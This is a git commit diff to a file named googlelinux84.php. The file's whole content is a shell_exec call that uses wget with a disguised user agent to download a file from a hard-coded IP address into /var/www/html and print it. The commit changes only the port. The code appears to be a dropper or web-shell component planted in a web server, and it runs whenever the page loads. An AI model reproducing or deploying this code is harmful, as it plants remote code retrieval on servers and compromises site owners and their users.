a45812d1a6f669f0d963e222b4e042ef66f3c97f
mobileapps84741274 <64268204+mobileapps84741274@users.noreply.github.com>
2020-10-05 23:26:29 +0200

    Update googlelinux84.php

--- googlelinux84.php
+++ googlelinux84.php
@@ -1,5 +1,5 @@
 <?php
 
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/googlelinux84 http://154.127.52.52/googlelinux84.php;cat /var/www/html/googlelinux84");
+echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/googlelinux84 http://154.127.52.52:8884/googlelinux84.php;cat /var/www/html/googlelinux84");
 
 ?>
